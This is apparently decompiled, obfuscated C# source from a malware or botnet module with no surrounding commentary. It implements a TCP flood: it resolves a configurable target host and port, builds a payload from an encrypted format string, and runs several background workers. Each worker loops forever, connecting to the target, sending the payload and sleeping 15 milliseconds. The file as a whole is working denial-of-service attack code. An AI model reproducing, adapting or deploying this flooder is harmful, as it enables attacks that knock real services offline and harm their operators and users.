using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ns1;

internal class Class3
{
	private static IPEndPoint ipendPoint_0;

	private static BackgroundWorker[] backgroundWorker_0;

	private static byte[] byte_0;

	private static bool _0024FD_002422 = false;

	public static string string_0 = string.Empty;

	public static string string_1 = string.Empty;

	public static ushort ushort_0 = 0;

	private static int int_0 = 2;

	public static void smethod_0()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).get_AddressList()[0], (int)ushort_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), (int)ushort_0);
		}
		byte_0 = Encoding.Default.GetBytes(string.Format(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_49(), string_1, Environment.NewLine));
		backgroundWorker_0 = (BackgroundWorker[])(object)new BackgroundWorker[int_0];
		_0024FD_002422 = true;
		for (int i = 0; i < int_0; i++)
		{
			backgroundWorker_0[i] = new BackgroundWorker();
			backgroundWorker_0[i].add_DoWork(new DoWorkEventHandler(smethod_2));
			backgroundWorker_0[i].set_WorkerSupportsCancellation(true);
			backgroundWorker_0[i].RunWorkerAsync();
		}
	}

	public static void smethod_1()
	{
		try
		{
			_0024FD_002422 = false;
			for (int i = 0; i < int_0; i++)
			{
				backgroundWorker_0[i].CancelAsync();
				backgroundWorker_0[i] = null;
			}
		}
		catch
		{
		}
	}

	private static void smethod_2(object sender, DoWorkEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		while (_0024FD_002422)
		{
			try
			{
				Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)1, (ProtocolType)6);
				val.Connect((EndPoint)(object)ipendPoint_0);
				val.set_Blocking(false);
				val.Send(byte_0, (SocketFlags)0);
				Thread.Sleep(15);
			}
			catch
			{
			}
		}
	}
}
